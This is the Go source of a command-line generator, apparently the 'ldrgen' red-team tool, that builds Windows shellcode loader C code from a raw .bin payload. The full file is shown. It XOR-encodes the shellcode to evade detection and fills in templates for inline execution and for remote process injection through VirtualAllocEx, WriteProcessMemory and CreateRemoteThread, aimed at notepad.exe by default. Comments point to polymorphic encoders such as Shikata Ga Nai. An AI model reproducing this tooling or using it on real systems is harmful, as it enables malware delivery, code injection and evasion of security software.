package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

var (
	shellcodePath = flag.String("bin", "", "Path to shellcode .bin file")
	outputPath    = flag.String("out", "", "Output folder")
	ldrToken      = flag.String("ldr", "", "Loader token")
	enc           = flag.String("enc", "", "Encryption type (optional)")
	key           = flag.String("key", "", "Encryption key (optional)")
	template_path = flag.String("template", "", "Path to template folder (default: ./template)")
	cleanup       = flag.Bool("cleanup", false, "Cleanup? (delete encrypted shellcode file)")
	help          = flag.Bool("help", false, "Print help")
)

type token struct {
	name   string
	method string
	enc    bool
}

var tokens = []token{
	{
		name:   "inline",
		method: "VirtualAlloc, memcpy, ((void(*)())exec)();",
		enc:    false,
	},
	{
		name:   "inline_xor",
		method: "VirtualAlloc, xorShellcode, memcpy, ((void(*)())exec)();",
		enc:    true,
	},
	{
		name:  "createremotethread",
		method: "OpenProcess, VirtualAllocEx (PAGE_EXECUTE_READWRITE), WriteProcessMemory, CreateRemoteThread, WaitForSingleObject, CloseHandle",
		enc:   false,
	},
	{
		name:   "createremotethreadrx",
		method: "OpenProcess, VirtualAllocEx (PAGE_READWRITE), WriteProcessMemory, VirtualProtect (PAGE_EXECUTE_READ), CreateRemoteThread, WaitForSingleObject, CloseHandle",
		enc:    false,
	},
}

func PrintHelp() {
	text := `
Usage: ./ldr [options]

Generates source code for a shellcode loader (Windows x64/x86) from a shellcode binary file (.bin).
https://github.com/gatariee/ldrgen

Options:
  -bin <path>      Path to the shellcode .bin file. (Required)
                     Example: -bin ./Template/Bin/Calc.bin

  -out <path>      Output folder where the generated loader will be saved. (Required)
                     Example: -out ./Output

  -ldr <token>     Loader token to be used in the generation process. (Required)
                     Supported tokens: [Inline, Inline_Xor, CreateRemoteThread, CreateRemoteThreadRX]
                     Example: -ldr inline

  -enc <type>      Encryption type for the shellcode. (Optional)
                     Supported types: [xor]
                     Example: -enc xor

  -key <key>       Encryption key for the specified encryption type. (Optional)
                     Example: -key mySecretKey1234
                     Default: aaaabbbbccccdddd

  -template <path> Path to the template folder to be used for generating the loader. (Optional)
                     Example: -template /path/to/custom/template
                     Default: ./template

  -cleanup         Cleanup? (delete encrypted shellcode file)

  -help            Print this help message.

Examples:
  ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr Inline
  ./ldr -bin ./Template/Bin/Calc.bin -out ./Output -ldr Inline_Xor -enc xor -key mySecretKey1234
  ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr Inline_Xor -enc xor -key uashdikasjhdasdas --cleanup
  ./ldr -bin ./Template/Bin/Calc.bin -out ./output -ldr CreateRemoteThread 
`
	fmt.Println(text)
}

func tokenMethod(token string) string {
	for _, t := range tokens {
		if strings.EqualFold(t.name, token) {
			return t.method
		}
	}
	return ""
}

func tokenExists(token string) bool {
	for _, t := range tokens {
		if strings.EqualFold(t.name, token) {
			return true
		}
	}
	return false
}

func tokenEnc(token string) bool {
	for _, t := range tokens {
		if strings.EqualFold(t.name, token) {
			return t.enc
		}
	}
	return false
}

func GetAbsFilePath(folderPath, fileName string) (string, error) {
	absFolderPath, err := filepath.Abs(strings.TrimSpace(folderPath))
	if err != nil {
		return "", fmt.Errorf("failed to get absolute path: %v", err)
	}

	return filepath.Join(absFolderPath, strings.TrimSpace(fileName)), nil
}

func ReadFile(filePath string) (string, error) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}

	return string(content), nil
}

func ParseBinaryFile(filePath string) ([]string, error) {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	var byteArray []string
	for _, b := range content {
		byteArray = append(byteArray, fmt.Sprintf("0x%02X", b))
	}

	return byteArray, nil
}

func SaveToFile(folderPath, fileName, content string) error {
	filePath, err := GetAbsFilePath(folderPath, fileName)
	if err != nil {
		return err
	}

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		if err := os.MkdirAll(filepath.Dir(filePath), 0o755); err != nil {
			return err
		}
	}

	return os.WriteFile(filePath, []byte(content), 0o644)
}

func ToCArray(filePath string) (string, error) {
	byteArray, err := ParseBinaryFile(filePath)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("{ %s }", strings.Join(byteArray, ", ")), nil
}

func ProcessShellcodeTemplate(shellcodePath string, args ...string) error {
	if len(args) > 1 {
		enc := args[0]
		key := args[1]

		switch enc {
		case "xor":
			fmt.Println("[!!!] XORing shellcode with key:", key)
			shellcode, err := os.ReadFile(shellcodePath)
			if err != nil {
				return err
			}

			var byteArray []string
			for _, b := range shellcode {
				byteArray = append(byteArray, fmt.Sprintf("0x%02X", b))
			}

			ba := fmt.Sprintf("{ %s }", strings.Join(byteArray, ", "))

			fmt.Println("[Sanity Check] Starting bytes (before XOR): ", ba[0:24], "... }")

			for i := 0; i < len(shellcode); i++ {
				shellcode[i] ^= key[i%len(key)]
			}

			err = os.WriteFile(shellcodePath+".enc", shellcode, 0o644)
			if err != nil {
				return err
			}

			shellcodePath = shellcodePath + ".enc"

			fmt.Printf("[*] Encrypted shellcode saved to: %s\n\n", shellcodePath)

		default:
			// enc type specified is empty
		}
	}

	shellcodeArray, err := ToCArray(shellcodePath)
	if err != nil {
		return err
	}

	fileInfo, err := os.Stat(shellcodePath)
	if err != nil {
		return err
	}

	shellcode_template, err := ReadFile(filepath.Join(*template_path, "Source/Shellcode.c"))
	if err != nil {
		return err
	}

	shellcodeTemplate := strings.ReplaceAll(shellcode_template, "${SHELLCODE}", shellcodeArray)
	shellcodeTemplate = strings.ReplaceAll(shellcodeTemplate, "${SHELLCODE_SIZE}", fmt.Sprintf("%d", fileInfo.Size()))

	abs, err := filepath.Abs(strings.TrimSpace(*outputPath))
	if err != nil {
		return err
	}

	fmt.Println("[*] Saving generated files to:", abs)

	fmt.Println("[SHELLCODE] Shellcode size:", fileInfo.Size(), "bytes")
	fmt.Println("[SHELLCODE] Starting bytes: ", shellcodeArray[0:24], "... }")

	err = SaveToFile(*outputPath, "Shellcode.c", shellcodeTemplate)
	if err != nil {
		return err
	}

	fmt.Println("[*] Shellcode.c -> OK")

	header_template, err := ReadFile(filepath.Join(*template_path, "Include/Shellcode.h"))
	if err != nil {
		return err
	}
	fmt.Println("[*] Shellcode.h -> OK")

	err = SaveToFile(*outputPath, "Shellcode.h", header_template)
	if err != nil {
		return err
	}

	return nil
}

func ProcessLoaderTemplate(token string, args ...string) error {
	var enc string
	var key string

	if len(args) > 0 {
		enc = args[0]
		key = args[1]
	}

	method := tokenMethod(token)
	fmt.Println("[LDR] Using:", method)

	switch token {
	case "inline":
		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Inline.c"))
		if err != nil {
			return err
		}

		err = SaveToFile(*outputPath, "Main.c", ldr)
		if err != nil {
			return err
		}

	case "inline_xor":

		/*
			need to pass key into ldr template
		*/

		fmt.Println("[LDR] enc_type: ", enc)
		fmt.Println("[LDR] key: ", key)
		ldr, err := ReadFile(filepath.Join(*template_path, "Source/Inline_Xor.c"))
		if err != nil {
			return err
		}

		ldr = strings.ReplaceAll(ldr, "${KEY}", key)
		err = SaveToFile(*outputPath, "Main.c", ldr)
		if err != nil {
			return err
		}

		xor, err := ReadFile(filepath.Join(*template_path, "Source/Xor.c"))
		if err != nil {
			return err
		}

		err = SaveToFile(*outputPath, "Xor.c", xor)
		if err != nil {
			return err
		}

		xor_h, err := ReadFile(filepath.Join(*template_path, "Include/Xor.h"))
		if err != nil {
			return err
		}

		err = SaveToFile(*outputPath, "Xor.h", xor_h)
		if err != nil {
			return err
		}

	case "createremotethread":

		/*
			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThread.c
			allocates RWX memory sections, use this for:
			- https://unprotect.it/technique/shikata-ga-nai-sgn/#:~:text=Shikata%20Ga%20Nai%20(SGN)%20is,a%20self%2Ddecoding%20obfuscated%20shellcode.
			- any shellcode that changes itself at runtime (e.g. polymorphic shellcode)
		*/

		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThread.c"))
		if err != nil {
			return err
		}

		err = SaveToFile(*outputPath, "Main.c", ldr)
		if err != nil {
			return err
		}
	
	case "createremotethreadrx":
		/* 
			ldr looks for "notepad.exe" change this to your requirements at: ./{template}/Source/CreateRemoteThreadRX.c
			allocates RWX, writes shellcode to memory, changes memory to RX, creates remote thread
			VirtualProtectEx
		*/

		ldr, err := ReadFile(filepath.Join(*template_path, "Source/CreateRemoteThreadRX.c"))
		if err != nil {
			return err
		}

		err = SaveToFile(*outputPath, "Main.c", ldr)
		if err != nil {
			return err
		}
		
	default:
		fmt.Println("Unknown token:", token)
	}

	fmt.Println("[*] Main.c -> OK")
	return nil
}

func init() {
	flag.Usage = PrintHelp
	flag.Parse()

	if *help {
		PrintHelp()
		os.Exit(0)
	}

	if *shellcodePath == "" || *outputPath == "" || *ldrToken == "" {
		PrintHelp()
		os.Exit(0)
	}

	if *template_path == "" {
		fmt.Println("[*] Using default template path: ./templates")
		*template_path = "./templates"
	}

	if !tokenExists(*ldrToken) {
		fmt.Println("[*] Unknown loader token:", *ldrToken)
		os.Exit(0)
	}

	needsEnc := tokenEnc(*ldrToken)
	if needsEnc && *enc == "" {
		fmt.Println("[*] Encryption type not specified, using default type: xor")
		*enc = "xor"
	}

	if !needsEnc && *enc != "" {
		fmt.Println("[*] Encryption type specified, but not needed for this loader token:", *ldrToken)
		os.Exit(0)
	}

	if !needsEnc && *key != "" {
		fmt.Println("[*] Encryption key specified, but not needed for this loader token:", *ldrToken)
		os.Exit(0)
	}

	if needsEnc && *key == "" {
		fmt.Println("[*] Encryption key not specified, using default key: aaaabbbbccccdddd")
		*key = "aaaabbbbccccdddd"
	}
}

func main() {
	err := ProcessShellcodeTemplate(*shellcodePath, *enc, *key)
	if err != nil {
		fmt.Println("Error processing shellcode:", err)
		return
	}

	err = ProcessLoaderTemplate(strings.ToLower(*ldrToken), *enc, *key)
	if err != nil {
		fmt.Println("Error processing loader:", err)
		return
	}

	if *enc != "" && *cleanup {
		fmt.Println("[CLEANUP] Removing encrypted shellcode file:", *shellcodePath+".enc")
		err = os.Remove(*shellcodePath + ".enc")
		if err != nil {
			fmt.Println("[!] Error removing encrypted shellcode file:", err)
			return
		}
	}

	fmt.Println("[*] Done!")
}
